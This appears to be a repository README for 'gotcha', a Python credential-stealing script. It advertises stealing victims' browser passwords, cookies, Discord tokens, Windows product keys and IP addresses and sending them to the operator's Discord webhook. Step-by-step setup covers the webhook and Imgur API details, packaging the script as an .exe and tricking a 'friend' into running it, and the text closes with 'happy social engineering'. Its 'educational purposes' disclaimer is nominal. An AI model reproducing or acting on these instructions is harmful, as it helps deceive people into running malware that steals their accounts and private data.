  <h3 align="center">gotcha | simple credentials extraction script, written in Python.</h3>
  <p align="center">
    steal victim's online credentials, discord token, cookies, windows product key & more => all data to your Discord webhook of choice.
  
## version 1 : "`gotcha.py`"

utilizes Discord's webhooks : sends victim's credentials, product key, and token. (indiviually)
| --- |
supports Chrome, and Microsoft Edge : can't garauntee its functionality .
( if you understand, open a PR with your code )
| --- |
## instructions => version 1

1. create a Discord webhook, for more information : https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
2. find the following variables in, "`gotcha.py`": "whID", "whAT".

"whID" = `Webhook ID`

"whAT" = `Webhook Token/Auth Token`

3. replace these variables with the following found in your Discord webhook.

`https//discord.com/api/webhooks/`(**1**)`/`(**2**)
| --- |
(**1**) = "whID"
| --- |
(**2**) = "whAT"
| --- |
4. save, now you're set. If you'd like : you can .exe the script using Pyinstaller, https://pypi.org/project/pyinstaller/
5. drop to your friend, and have them run it.

### example => "`gotcha.py`"
![](https://cdn.discordapp.com/attachments/796598097986715668/797299038536990760/example.png)
---------------------------------------------------

## version 2 : "`gotchav2.py`"
same functionality as V1 + IP Address, alot more efficient & with embedding.
| --- |
all data sent in a neat format, requires a little more effort for setup.
| --- |

## instructions => version 2

1. Follow same steps as Version 1, stop at Step 3.
2. Create an Imgur account, and gain API access : https://api.imgur.com/oauth2/addclient, for more docu. => https://api.imgur.com/
3. One complete, find the function in "`gotchav2.py`": "upload".
4. Replace `CLIENT-ID-HERE`, and `CLIENT-SECRET-HERE`: with your Imgur API details, "Client ID", and "Client Secret"
5. Begin from Step 4 in Version 1.

### example => "`gotchav2.py`"
![](https://cdn.discordapp.com/attachments/799822588296691752/800068801412202516/Capture.PNG)

## disclaimer : 
i'm not responsible, nor am i liable for any damages caused by others distributing, or using this for malicious purposes.

this is solely for educational purposes, and no harm is intended.

happy social engineering! <3
